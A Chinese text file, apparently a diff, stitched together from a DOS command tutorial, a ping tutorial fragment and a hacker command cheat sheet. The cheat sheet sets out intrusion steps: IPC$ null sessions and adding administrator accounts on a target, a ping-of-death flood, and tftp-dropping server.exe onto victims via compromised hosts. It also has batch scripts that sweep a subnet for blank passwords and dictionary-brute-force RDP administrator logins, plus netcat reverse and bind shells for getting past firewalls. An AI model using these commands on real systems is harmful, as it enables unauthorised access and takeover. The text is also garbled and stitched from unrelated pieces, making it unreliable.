+    （1）选用/DOS参数根据目录里残留的记录来恢复文件。由于文件被删除时，目录所记载斩文件名第一个字符会被改为E5，DOS即依据文件开头的E5和其后续的字符来找到欲恢复的文件，所以，UNDELETE会要求用户输入一个字符，以便将文件名字补齐。但此字符不必和原来的一样，只需符合DOS的文件名规则即可。
+    （2）选用/LIST只“列出”符合指定条件的文件而不做恢复，所以对磁盘内容完全不会有影响。
+    （3）选用/ALL自动将可完全恢复的文件完全恢复，而不一一地询问用户，使用此参数时，若UNDELTE利用目录里残留的记录来将文件恢复，则会自动选一个字符将文件名补齐，并且使其不与现存文件名相同，选用字符的优选顺序为：#%——0000123456789A~Z。
+
+   
+        UNDELETE还具有建立文件的防护措施的功能，已超出本课程授课范围，请读者在使用些功能时查阅有关DOS手册。
+    七、其它命令
+    （一）CLS——清屏幕命令
+    1功能：清除屏幕上的所有显示，光标置于屏幕左上角。
+    2类型：内部命令
+    3格式：CLS
+    （二） VER查看系统版本号命令
+    1功能：显示当前系统版本号
+    2类型：内部命令
+    3格式：VER
+    （三） DATA日期设置命令
+    1功能：设置或显示系统日期。
+    2类型：内部命令
+    3格式：DATE[mm——dd——yy]
+    4使用说明：
+    （1）省略[mm——dd——yy]显示系统日期并提示输入新的日期，不修改则可直接按回车键，[mm——dd——yy]为“月月——日日——年年”格式；
+    （2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。
+    （四） TIME系统时钟设置命令
+    1功能：设置或显示系统时期。
+    2类型：内部命令
+    3格式：TIME[hh：mm：ss：xx]
+    4使用说明：
+    （1）省略[hh：mm：ss：xx]，显示系统时间并提示输入新的时间，不修改则可直接按回车键，[hh：mm：ss：xx]为“小时：分钟：秒：百分之几秒”格式；
+    （2）当机器开始启动时，有自动处理文件（AUTOEXEC.BAT）被执行，则系统不提示输入系统日期。否则，提示输入新日期和时间。
+    （五）MEM查看当前内存状况命令
+    1功能：显示当前内存使用的情况
+    2类型：外部命令
+    3格式：MEM[/C][/F][/M][/P]
+    4使用说明：
+    （1）选用/C参数列出装入常规内存和CMB的各文件的长度，同时也显示内存空间的使用状况和最大的可用空间；
+    （2）选用/F参数分别列出当前常规内存剩余的字节大小和UMB可用的区域及大小；  
+    （3）选用/M参数显示该模块使用内存地地址、大小及模块性质；
+    （4）选用/P参数指定当输出超过一屏时，暂停供用户查看。
+    （六） MSD显示系统信息命令
+    1功能：显示系统的硬件和操作系统的状况。
+    2类型：外部命令
+    3格式：MSD[/S]
+    4使用说明：
+    （1）选用/I参数时，不检测硬件；
+    （2）选用/B参数时，以黑白方式启动MSD；
+    （3）选用/S参数时，显示出简明的系统报告。
+ping命令详解
+对于Windows下ping命令相信大家已经再熟悉不过了，但是能把ping的功能发挥到最大的人却并不是很多，当然我也并不是说我可以让ping发挥最大的功能，我也只不过经常用ping这个工具，也总结了一些小经验，现在和大家分享一下。 
+现在我就参照ping命令的帮助说明来给大家说说我使用ping时会用到的技巧，ping只有在安装了TCP/IP协议以后才可以使用： 
+ping [-t] [-a] [-n count] [-l length] [-f] [-i ttl] [-v tos] [-r count] [-s count] [[-j computer-list] | [-k computer-list]] [-wz timeout] destination-list 
+Options: 
+-t Ping the specified host until stopped.To see statistics and continue - type Control-Break;To stop - type Control-C. 
+不停的ping地方主机，直到你按下Control-C。 
+此功能没有什么特别的技巧，不过可以配合其他参数使用，将在下面提到。 
+”", , 
+.常量 常_帮助4, "“net use \\ip\ipc$ " " /user:" " 建立IPC空链接 
+
+net use \\ip\ipc$ "密码" /user:"用户名" 建立IPC非空链接 
+
+net use h: \\ip\c$ "密码" /user:"用户名" 直接登陆后映射对方C：到本地为H: 
+
+net use h: \\ip\c$ 登陆后映射对方C：到本地为H: 
+
+net use \\ip\ipc$ /del 删除IPC链接 
+
+net use h: /del 删除映射对方到本地的为H:的映射 
+
+net user 用户名 密码 /add 建立用户 
+
+net user guest /active:yes 激活guest用户 
+
+net user 查看有哪些用户 
+
+net user 帐户名 查看帐户的属性 
+
+net localgroup ***istrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：***istrator后加s用复数 
+
+net start 查看开启了哪些服务 
+
+net start 服务名  开启服务；(如:net start telnet， net start schedule) 
+
+net stop 服务名 停止某服务 
+
+net time \\目标ip 查看对方时间 
+
+net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 
+
+net view 查看本地局域网内开启了哪些共享 
+
+net view \\ip 查看对方局域网内开启了哪些共享 
+
+net config 显示系统网络设置 
+
+net logoff 断开连接的共享 
+
+net pause 服务名 暂停某服务 
+
+net send ip "文本信息" 向对方发信息 
+
+net ver 局域网内正在使用的网络连接类型和信息 
+
+net share 查看本地开启的共享 
+
+net share ipc$ 开启ipc$共享 
+
+net share ipc$ /del 删除ipc$共享 
+
+net share c$ /del 删除C：共享 
+
+net user guest 12345 用guest用户登陆后用将密码改为12345 
+
+net password 密码 更改系统登陆密码 
+
+netstat -a 查看开启了哪些端口,常用netstat -an 
+
+netstat -n 查看端口的网络连接情况，常用netstat -an 
+
+netstat -v 查看正在进行的工作 
+
+netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） 
+
+netstat -s 查看正在使用的所有协议使用情况 
+
+nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 
+
+tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 
+
+ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 
+
+ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) 
+
+ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 
+
+tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
+
+kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) 
+
+del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件
+
+#2 二：
+
+del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） 
+
+move 盘符\路径\要移动的文件名 存放移动文件的路径\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 
+
+fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，"> "和"> >" 是重定向命令 
+
+at id号 开启已注册的某个计划任务 
+
+at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 
+
+at id号 /delete 停止某个已注册的计划任务 
+
+at 查看所有的计划任务 
+
+at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 
+
+finger username @host 查看最近有哪些用户登陆 
+
+telnet ip 端口 远和登陆服务器,默认端口为23 
+
+open ip 连接到IP（属telnet登陆后的命令） 
+
+telnet 在本机上直接键入telnet 将进入本机的telnet 
+
+copy 路径\文件名1 路径\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 
+
+copy c:\srv.exe \\ip\***$ 复制本地c:\srv.exe到对方的***下 
+
+copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 
+
+copy \\ip\***$\svv.exe c:\ 或:copy\\ip\***$\*.* 复制对方***i$共享下的srv.exe文件（所有文件）至本地C： 
+
+xcopy 要复制的文件或目录树 目标地址\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 
+
+tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 
+
+tftp -i 对方IP put c:\server.exe 登陆后，上传本地c:\server.exe至主机 
+
+ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) 
+
+route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface 
+
+arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 
+
+start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 
+
+mem 查看cpu使用情况 
+
+attrib 文件名(目录名) 查看某文件（目录）的属性 
+
+attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 
+
+dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 
+
+date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 
+
+set 指定环境变量名称=要指派给变量的字符 设置环境变量 
+
+set 显示当前所有的环境变量 
+
+set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 
+
+pause 暂停批处理程序，并显示出：请按任意键继续.... 
+
+if 在批处理程序中执行条件处理（更多说明见if命令及变量） 
+
+goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） 
+
+call 路径\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） 
+
+for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） 
+
+echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 
+
+echo 信息 在屏幕上显示出信息 
+
+echo 信息 >> pass.txt 将"信息"保存到pass.txt文件中 
+
+findstr "Hello" aa.txt 在aa.txt文件中寻找字符串hello 
+
+find 文件名 查找某文件 
+
+title 标题名字 更改CMD窗口标题名字 
+
+color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 
+
+prompt 名称 更改cmd.exe的显示的命令提示符(把C:\、D:\统一改为：EntSky\ )
+
+#3 三：
+
+ver 在DOS窗口下显示版本信息 
+
+winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） 
+
+format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS 
+
+md 目录名 创建目录 
+
+replace 源文件 要替换文件的目录 替换文件 
+
+ren 原文件名 新文件名 重命名文件名 
+
+tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 
+
+type 文件名 显示文本文件的内容 
+
+more 文件名 逐屏显示输出文件 
+
+doskey 要锁定的命令＝字符
+
+doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= 
+
+taskmgr 调出任务管理器 
+
+chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 
+
+tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
+
+exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
+
+path 路径\可执行文件的文件名 为可执行文件设置一个路径。 
+
+cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
+
+regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
+
+regedit /e 注册表文件名 导出注册表 
+
+cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\test.txt /D pub 设定d:\test.txt拒绝pub用户访问。 
+
+cacls 文件名 查看文件的访问用户权限列表 
+
+REM 文本内容 在批处理文件中添加注解 
+
+netsh 查看或更改本地网络配置情况
+
+#4 四：
+
+IIS服务命令： 
+
+iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
+
+iisreset /start或stop 启动（停止）所有Internet服务 
+
+iisreset /restart 停止然后重新启动所有Internet服务 
+
+iisreset /status 显示所有Internet服务状态 
+
+iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
+
+iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
+
+iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
+
+iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 
+
+FTP 命令： (后面有详细说明内容) 
+
+ftp的命令行格式为:
+
+ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。
+
+－d 使用调试方式。 
+
+－n 限制ftp的自动登录,即不使用.netrc文件。
+
+－g 取消全局文件名。 
+
+help [命令] 或 ？[命令] 查看命令说明 
+
+bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
+
+pwd 列出当前远端主机目录 
+
+put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 
+
+get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
+
+mget [remote-files] 从远端主机接收一批文件至本地主机 
+
+mput local-files 将本地主机中一批文件传送至远端主机 
+
+dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 
+
+ascii 设定以ASCII方式传送文件(缺省值) 
+
+bin 或 image 设定以二进制方式传送文件 
+
+bell 每完成一次文件传送,报警提示 
+
+cdup 返回上一级目录 
+
+close 中断与远程服务器的ftp会话(与open对应) 
+
+open host[port] 建立指定ftp服务器连接,可指定连接端口 
+
+delete 删除远端主机中的文件 
+
+mdelete [remote-files] 删除一批文件 
+
+mkdir directory-name 在远端主机中建立目录 
+
+rename [from] [to] 改变远端主机中的文件名 
+
+rmdir directory-name 删除远端主机中的目录 
+
+status 显示当前FTP的状态 
+
+system 显示远端主机系统类型 
+
+user user-name [password] [account] 重新以别的用户名登录远端主机 
+
+open host [port] 重新建立一个新的连接 
+
+prompt 交互提示模式 
+
+macdef 定义宏命令 
+
+lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
+
+chmod 改变远端主机的文件权限 
+
+case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
+
+cd remote－dir 进入远程主机目录 
+
+cdup 进入远程主机目录的父目录 
+
+! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip
+
+
+cp 复制文件 
+
+mv 移动文件 
+
+rm 文件名 删除文件，rm -a 目录名删除目录及子目录 
+
+mkdir 目录名 建立目录 
+
+rmdir 删除子目录，目录内没有文档。 
+
+chmod 设定档案或目录的存取权限 
+
+grep 在档案中查找字符串 
+
+diff 档案文件比较 
+
+find 档案搜寻 
+
+date 现在的日期、时间 
+
+who 查询目前和你使用同一台机器的人以及Login时间地点 
+
+w 查询目前上机者的详细资料 
+
+whoami 查看自己的帐号名称 
+
+groups 查看某人的Group 
+
+passwd 更改密码 
+
+history 查看自己下过的命令 
+
+ps 显示进程状态 
+
+kill 停止某进程 
+
+gcc 黑客通常用它来编译C语言写的文件 
+
+su 权限转换为指定使用者 
+
+telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 
+
+ftp ftp连接上某服务器（同win2K） 
+
+附：批处理命令与变量
+
+1：for命令及变量 基本格式： 
+
+FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。
+
+批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3
+
+(set):指定一个或一组文件，可使用通配符，如：(D:\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }
+
+command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开
+
+command_parameters：为特定命令指定参数或命令行开关
+
+IN (set)：指在(set)中取值；DO command ：指执行command
+
+参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\pass.txt)时 }。 
+
+用法举例： 
+
+@echo off 
+
+echo 用法格式：test.bat *.*.* > test.txt 
+
+for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:***istrator | find "命令成功完成" >>test.txt 
+
+存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立***istrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。
+
+/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 
+
+@echo off 
+
+echo 用法格式：ok.bat ip 
+
+FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 
+
+存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。http://www.jz5u.com
+#7 七：
+
+2：if命令及变量 基本格式： 
+
+IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。
+
+例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。
+
+0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 
+
+IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。
+
+例：“if "%2%"=="4" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "） 
+
+IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。
+
+例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到":end"标签处。 
+
+IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.” 
+
+（二）系统外部命令(均需下载相关工具)：
+
+1、瑞士军刀：nc.exe
+
+参数说明： 
+
+-h 查看帮助信息 
+
+-d 后台模式 
+
+-e prog程序重定向，一旦连接就执行［危险］ 
+
+-i secs延时的间隔 
+
+-l 监听模式，用于入站连接 
+
+-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
+
+-n IP地址，不能用域名 
+
+-o film记录16进制的传输 
+
+-p[空格]端口 本地端口号 
+
+-r 随机本地及远程端口 
+
+-t 使用Telnet交互方式 
+
+-u UDP模式 
+
+-v 详细输出，用-vv将更详细 
+
+-w数字 timeout延时间隔 
+
+-z 将输入，输出关掉（用于扫锚时） 
+
+基本用法： 
+
+nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 
+
+nc -l -p 80 开启本机的TCP 80端口并监听 
+
+nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 
+
+nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 
+
+nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 
+
+高级用法： 
+
+nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
+
+nc -L -p 80 > c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt 
+
+nc -L -p 80 < c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用 
+
+type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用 
+
+本机上用：nc -l -p 本机端口 
+
+在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K
+
+nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 
+
+本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 
+
+在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 
+
+备 注： 
+
+| 管道命令 
+
+< 或 > 重定向命令。“<”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 
+
+＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt >> d:\log.txt 意思是：后台执行dir，并把结果存在d:\log.txt中 
+
+>与>>的区别  ">"指：覆盖；">>"指：保存到(添加到）。
+
+如：@dir c:\winnt >> d:\log.txt和@dir c:\winnt > d:\log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。
+
+#8 八：
+
+2、扫锚工具：xscan.exe
+
+基本格式 
+
+xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息 
+
+xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息 
+
+
+用法示例 
+
+tscrack 192.168.0.1 -l ***istrator -w pass.dic 远程用密码字典文件暴破主机的***istrator的登陆密码 
+
+tscrack 192.168.0.1 -l ***istrator -p 123456 用密码123456远程登陆192.168.0.1的***istrator用户 
+
+@if not exist ipcscan.txt goto noscan 
+
+@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i 
+
+nscan 
+
+@echo 3389.txt no find or scan faild 
+
+(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt) 
+
+3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat 
+
+@if not exist tscrack.exe goto noscan 
+
+@tscrack %1 -l ***istrator -w pass.dic >>rouji.txt 
+
+:noscan 
+
+@echo tscrack.exe no find or scan faild 
+
+(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了) 
+
+hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的***istrator密码，并将破解结果保存在rouji.txt文件中。 
+
+5、其它：
+
+Shutdown.exe 
+
+Shutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） 
+
+fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） 
+
+fpipe -l 80 -s 1029 -r 80www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全www.sina.com.cn的主机信息
+Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 
+
+OpenTelnet.exe (远程开启telnet工具) 
+
+opentelnet.exe \\IP 帐号 密码 ntlm认证方式 Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。
+
+NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。
+
+ResumeTelnet.exe (OpenTelnet附带的另一个工具) 
+
+resumetelnet.exe \\IP 帐号 密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。
+
+#10 十：
+
+6、FTP命令详解：
+
+FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。
+
+FTP的命令行格式为： 
+
+ftp -v -d -i -n -g [主机名] ，其中
+
+-v 显示远程服务器的所有响应信息；
+
+-n 限制ftp的自动登录，即不使用；.n etrc文件；
+
+-d 使用调试方式；
+
+-g 取消全局文件名。
+
+FTP使用的内部命令如下(中括号表示可选项):
+
+1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip 
+
+2.$ macro-ame[args]： 执行宏定义macro-name。
+
+3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。 
+
+4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。
+
+5.ascii：使用ascii类型传输方式。
+
+6.bell：每个命令执行完毕后计算机响铃一次。
+
+7.bin：使用二进制文件传输方式。
+
+8.bye：退出ftp会话过程。
+
+9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 
+
+10.cd remote-dir：进入远程主机目录。
+
+11.cdup：进入远程主机目录的父目录。 
+
+12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。
+
+13.close：中断与远程服务器的ftp会话(与open对应)。 
+
+14.cr：使用asscii方式传输文件时，将回车换行转换为回行。
+
+15.delete remote-file：删除远程主机文件。 
+
+16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。
+
+17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。 
+
+18.disconnection：同close。
+
+19.form format：将文件传输方式设置为format，缺省为file方式。 
+
+20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。
+
+21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 
+
+22.hash：每传输1024字节，显示一个hash符号(#)。
+
+23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 
+
+24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。
+
+25.image：设置二进制传输方式(同binary)。 
+
+26.lcd[dir]：将本地工作目录切换至dir。
+
+27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。 
+
+28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。
+
+29.mdelete[remote-file]：删除远程主机文件。 
+
+30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。
+
+31.mget remote-files：传输多个远程文件。 
+
+32.mkdir dir-name：在远程主机中建一目录。
+
+33.mls remote-file local-file：同nlist，但可指定多个文件名。 
+
+34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。
+
+35.modtime file-name：显示远程主机文件的最后修改时间。 
+
+36.mput local-file：将多个文件传输至远程主机。
+
+37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。
+
+38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。
+
+39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap ..[，].[，]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。
+
+40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。
+
+41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 
+
+42.passive：进入被动传输方式。
+
+43.prompt：设置多个文件传输时的交互提示。 
+
+44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。
+
+45.put local-file[remote-file]：将本地文件local-file传送至远程主机。 
+
+46.pwd：显示远程主机的当前工作目录。
+
+47.quit：同bye，退出ftp会话。 
+
+48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.
+
+49.recv remote-file[local-file]：同get。 
+
+50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。
+
+51.rhelp[cmd-name]：请求获得远程主机的帮助。 
+
+52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。
+
+53.rename[from][to]：更改远程主机文件名。 
+
+54.reset：清除回答队列。
+
+55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。 
+
+56.rmdir dir-name：删除远程主机目录。
+
+57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。 
+
+58.send local-file[remote-file]：同put。
+
